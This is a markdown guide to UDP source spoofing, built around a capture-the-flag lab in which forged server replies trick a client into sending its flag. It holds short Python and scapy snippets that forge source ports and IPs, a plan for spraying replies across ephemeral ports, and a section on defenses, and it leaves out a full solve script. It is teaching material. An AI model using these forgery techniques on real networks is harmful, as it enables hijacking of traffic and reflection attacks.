# UDP Spoofing

Field notes for the `interceptor_communication` lab and UDP source-forgery in general.

---

## TL;DR

A UDP datagram's **source IP** and **source port** are just numbers the sender writes
into the headers. Nothing in the protocol proves they are true. UDP has **no handshake
and no sequence numbers**, so a response is "authentic" only if the receiving program
bothers to check *who* sent it — and many don't. If a program trusts a reply based on
its source address/port alone, any host that can put a packet on the wire can **forge
that reply** and hijack the exchange.

---

## 1. Why UDP is spoofable (and TCP mostly isn't)

| | TCP | UDP |
|---|---|---|
| Connection setup | 3-way handshake (SYN/SYN-ACK/ACK) | none |
| State | sequence + ack numbers per byte | none |
| To inject off-path | must guess a 32-bit ISN | just send a datagram |
| Receiver's identity check | built into the stack | **only whatever the app does** |

To spoof a TCP stream from **off-path** (you can't see the victim's packets) you must
correctly guess the initial sequence number — historically the whole difficulty of TCP
spoofing. UDP has nothing to guess. You build a datagram with whatever source you like
and send it. The receiving socket's `recvfrom()` hands your packet to the application
exactly like a genuine one; the only defense is the application re-checking the peer.

Two situations:

- **On-path** — you can observe the victim's traffic (same LAN, a tap, ARP-spoofed).
  You see requests and can craft matching replies. Easy and reliable.
- **Off-path / blind** — you can't see the traffic and must guess timing and any
  tokens in the payload. Harder, but still possible when the protocol is predictable.

A lab subnet where you have a shell is effectively **on-path**: you know the ports,
the message format, and the timing from reading the code.

---

## 2. What you can forge, and what it costs

### Source **port** only — no privilege needed
A normal datagram socket lets you pick the source port by binding to it. The source IP
is still your real address, but if the target only validates the *port*, that's enough.

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("0.0.0.0", 31337))          # <-- our packets now leave FROM port 31337
s.sendto(b"payload", ("10.0.0.2", 31338))
```

The receiver's `recvfrom()` reports `peer_port == 31337`. No root required.

### Source **IP** too — raw sockets / scapy, needs root (CAP_NET_RAW)
To make the packet *also* appear to come from another host, you must write the IP header
yourself. Either a raw socket with `IP_HDRINCL`, or — far easier — **scapy**:

```python
from scapy.all import IP, UDP, send
pkt = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=31338) / b"payload"
send(pkt)            # scapy fills in lengths/checksums for you
```

`src="10.0.0.3"` is a complete lie — the packet claims to be from the server. This is
the real "spoofing" skill: it works even when the target checks the source IP, as long
as nothing *cryptographically* authenticates the sender. On `user_host` in the lab you
are privileged, so raw sends are allowed.

### Verify what you actually put on the wire
```bash
tcpdump -ni any udp and port 31338 -X        # watch src/dst/port/payload
```
or sniff in scapy: `sniff(filter="udp port 31338", prn=lambda p: p.summary())`.

---

## 3. The race you're fighting

When you forge a *reply*, you're usually competing with the **legitimate responder**,
which is also answering the victim's request. Whoever's packet the victim reads first
"wins" that round. In practice you don't win once — you **spam** the forged reply so one
of yours lands in a `recvfrom()` window. UDP has no dedup, so flooding is free.

This is exactly the mechanic behind real off-path attacks (DNS cache poisoning races the
real resolver; the Kaminsky attack is this idea at scale).

---

## 4. Defenses (so you recognise a *fixed* target)

- **Validate the source** — check `peer_host` *and* `peer_port`, not one of them.
- **`connect()` the UDP socket** to the expected peer so the kernel drops datagrams from
  anyone else (still only IP/port-level, but it closes the lazy case).
- **Challenge/response nonce** — put an unpredictable token in the request and require it
  echoed in the reply; an off-path attacker can't guess it.
- **Authenticated payloads** — DTLS, or an HMAC/signature over the message. This is the
  only defense that survives an on-path attacker who *can* forge the source perfectly.
- **Network-level BCP38** — ingress/egress filtering drops packets whose source IP
  doesn't belong to the originating subnet. Stops forged-IP packets from leaving/entering.

Rule of thumb: if the only thing standing between you and the flag is "the source looks
right," it's spoofable.

---

## 5. Lab walkthrough — `interceptor_communication` (guided)

> Goal of this section: understand the flaw well enough to write the exploit **yourself**.
> No finished solve script here on purpose.

### Topology

```
            dojjail virtual network  10.0.0.0/24

  user_host 10.0.0.1          client_host 10.0.0.2         server_host 10.0.0.3
  (your shell, privileged)    bound UDP :31338             bound UDP :31337
          │                        │                              │
          │                        │  every 1s: "ACTION?"  ─────► │
          │                        │ ◄─────  "NONE"  (sport 31337)│
          │                        │                              │
          │   ??? forged reply ??? │                              │
          └───────────────────────►│  (sport 31337, "FLAG:...")   │
```

### What the client trusts (read `run:25-38`)

The client sends `ACTION?` to the server every second, then blocks on `recvfrom`. Its
accept condition for a reply is only:

```python
message, (peer_host, peer_port) = client_socket.recvfrom(1024)
if peer_port == 31337 and message.startswith(b"FLAG"):
    _, flag_host, flag_port = message.strip().split(b":")
    client_socket.sendto(flag.encode(), (flag_host, int(flag_port)))
```

Read that slowly and answer two questions before continuing:

1. **What does the client check about the sender?** (Look at which of `peer_host` /
   `peer_port` appear in the `if`.)
2. **What is the exact byte format** a message must have to be accepted, and what does the
   client *do* with the two fields it parses out?

If you see it: the client will take a reply from **anyone**, as long as the UDP source
port is `31337` and the payload is `FLAG:<host>:<port>` — and it will then *send the flag
to a host and port you chose inside that payload.*

### Hints ladder (uncover one at a time)

1. You don't need to touch the server at all. The packet that matters is the one that
   reaches **the client** (`10.0.0.2:31338`).
2. The only header field the client verifies is the **source port** — it must be `31337`.
   Re-read §2: how do you make a datagram leave from a specific source port?
3. Notice `peer_host` is parsed but never compared. So two paths both work:
   - **minimal** — a plain socket bound to source port `31337` (your real IP is fine);
   - **full spoof** — scapy with `src="10.0.0.3"` to also impersonate the server.
   Do the minimal one first to prove the flaw, then redo it with scapy for the practice.
4. The payload's `<host>:<port>` is where the flag gets sent. Point it at **10.0.0.1** and
   a port **you are listening on**. So: start a UDP listener *before* you send, then put
   its address in the `FLAG:` string.
5. Timing: the real server answers `NONE` every second, competing for the same
   `recvfrom`. Don't send once — **loop and resend** your forged packet so one lands in a
   read window (see §3).

### Try-it-yourself checklist

- [ ] Open a UDP listener on `10.0.0.1:<port>` and keep it printing whatever arrives.
- [ ] Craft the payload `FLAG:10.0.0.1:<that port>`.
- [ ] Send it to `10.0.0.2:31338` **with source port 31337** (plain-socket version).
- [ ] Loop the send; watch the listener for the flag.
- [ ] Redo the send with scapy, forging `src=10.0.0.3`, and confirm it still works.
- [ ] (Bonus) run `tcpdump` to see your forged packet and the flag come back.

### Why it generalises

This is the shape of real UDP attacks: a stateless request/reply where the client trusts
the response's apparent origin. The same reasoning applies to **DNS** (spoofed answers),
**NTP/SNMP/memcached** (spoofed source IP for reflection/amplification), and any
home-grown UDP control protocol. The fix is always the same — authenticate the *message*,
not the *address*.

---

## 6. Level 2 — the client also checks the source IP (and uses an ephemeral port)

> This is the "up the game" variant: *"this challenge checks that the response came from the
> right server!"* Same module, same `run` layout, but the client is stricter. It's the
> **on-path** case §1's table anticipates — you share the segment and can *see* requests, so
> sniffing is available, and it's the intended method ("craft the server response with scapy,
> as you've done with TCP").

### What changed vs §5 (read `run:25-37`)

| | §5 (port-only) | §6 (this `run`) |
|---|---|---|
| Accept check | `peer_port == 31337` | `peer_host == "10.0.0.3"` **and** `peer_port == 31337` (`run:33`) |
| Client socket | bound to a fixed port (`31338`) | **unbound → ephemeral** source port (`run:27,31`) |
| Enough to win? | plain socket bound to sport `31337` | **no** — fails on *both* counts |

Why the §5 trick dies:

1. Your plain reply still leaves from your **real IP** `10.0.0.1`, so `peer_host == "10.0.0.3"`
   is false → rejected.
2. The client no longer listens on a known port. Its socket is created **once** outside the loop
   (`run:27`) and reused, so the kernel picks one **ephemeral** source port and keeps it for the
   client's whole life — you don't know it, so you don't even know where to send.

### Updated topology

```
            dojjail virtual network  10.0.0.0/24   (learning bridge: you CANNOT sniff .2<->.3)

  user_host 10.0.0.1          client_host 10.0.0.2         server_host 10.0.0.3
  (your shell, privileged)    UDP from EPHEMERAL port E     bound UDP :31337
          │                        │                              │
          │     (not visible) ·····│  every 1s: "ACTION?"  ─────► │   (bridge hides this)
          │                        │ ◄─────  "NONE"  (src 10.0.0.3:31337)
          │                        │                              │
          │  forged reply:  src=10.0.0.3  sport=31337  dport=E    │   (E = spray 32768-60999)
          └───────────────────────►│  payload "FLAG:10.0.0.1:C"   │
          │ ◄── flag to 10.0.0.1:C ─│  (client forwards it to you) │
```

### Two new problems, two techniques (both from §2)

- **Forge the source IP** → you must write the IP header, so this is the scapy / raw-socket
  path from §2: `IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=E) / payload`.
  Needs `CAP_NET_RAW`/root — and on `user_host` you are privileged (`run:39`), so it's allowed.
- **Find the unknown dport `E`** → two options, and which one works depends on whether you're
  truly on-path:
  - *Sniff* the client's `ACTION?` (`dst host 10.0.0.3 and dst port 31337`); its `UDP.sport`
    *is* `E`. Cleanest **if you can see the traffic**. But in this lab the hosts sit behind a
    **learning bridge**, so `user_host` does **not** receive the unicast between `10.0.0.2` and
    `10.0.0.3` — the sniff just hangs and never fires. (Verified: the solve script's sniffer
    never printed a port.)
  - *Spray* instead: `E` is somewhere in the ephemeral range (`cat
    /proc/sys/net/ipv4/ip_local_port_range`, default `32768–60999`), so forge the reply to
    **every** port in that range and loop. You never need to see the client's packet — you only
    need to *send to* it, which the bridge happily forwards. This is the method that actually
    lands the flag here. One matching packet is buffered by the client and consumed; the rest
    hit closed ports and are dropped (no buffer overflow). `E` is **stable** (one socket, reused
    for the client's life), so a single successful sweep is enough.

### Why one good forged packet is enough (the race, revisited — see §3)

The client does exactly **one `recvfrom` per loop** and UDP **buffers**. Even if the server's
`NONE` is read first, `NONE` fails `message.startswith(b"FLAG")` (`run:33`) and your buffered
`FLAG` is read on the *next* iteration. So once your `dport` matches `E`, delivery is essentially
guaranteed — you don't have to out-run the server, you just have to reach the right port. (Firing
a forged reply on *every* sniffed `ACTION?` is a fine, robust default.)

### Hints ladder (uncover one at a time)

1. The packet that matters still reaches **the client** — but now at an **ephemeral** port that
   isn't in the source. How could you find it, or avoid needing it?
2. Re-read `run:33`. The reply must now *look like it came from `10.0.0.3`*. A plain socket can't
   lie about its source IP — what tool from §2 can?
3. Try to sniff the client's request for its source port — and notice it never arrives: a
   learning bridge doesn't flood `.2`↔`.3` unicast to you. So sniffing is out here.
4. You don't actually need to *see* the client, only to *send to* it. The port is in a known
   range (`32768–60999`), so **spray** the forged reply across every port and loop.
5. That port is stable (one socket, reused), so one sweep that hits it is enough — the client
   buffers your packet and consumes it on its next loop.
6. The payload is unchanged: `FLAG:<host>:<port>` still tells the client where to deliver the
   flag — point it at `10.0.0.1:<a port you are listening on>` (§5, hint 4).

### Try-it-yourself checklist

- [ ] Start a UDP listener on `10.0.0.1:C` and keep it printing whatever arrives.
- [ ] (Optional) try sniffing `udp and dst host 10.0.0.3 and dst port 31337` — confirm it stays
      silent here (bridge hides it), so you'll spray instead.
- [ ] Confirm the ephemeral range: `cat /proc/sys/net/ipv4/ip_local_port_range`.
- [ ] With scapy, forge `IP(src=10.0.0.3, dst=10.0.0.2)/UDP(sport=31337, dport=(LO,HI))/b"FLAG:10.0.0.1:C"`.
- [ ] Send the whole sweep in a loop (~1s apart; the client re-reads every second).
- [ ] Watch the listener on port `C` for the flag.
- [ ] (Bonus) `tcpdump -ni any udp -X` to see your forged `src=10.0.0.3` packet go out and the
      flag come back to `10.0.0.1:C`.

### Why it generalises

Checking the source **IP** instead of just the port raises the bar only against an **off-path**
attacker. On-path (this lab, and real LAN/MITM positions) the source IP is as forgeable as the
port — you sniff the exchange and mint a matching reply. The real fix is unchanged from §4:
authenticate the **message** (nonce/HMAC/DTLS), because an on-path attacker can always forge the
**address**.

---

## Quick reference

```text
Forge source PORT only : plain socket, bind((0.0.0.0, PORT)), no root
Forge source IP + PORT : scapy IP(src=..)/UDP(sport=..), needs CAP_NET_RAW/root  (§6)
Unknown ephemeral dport: can't sniff behind a bridge -> spray 32768-60999, loop  (§6)
Win the reply race     : resend in a loop; UDP won't dedup — or just match the buffered dport
It's patched when       : payload is authenticated (nonce/HMAC/DTLS), not just the address
```
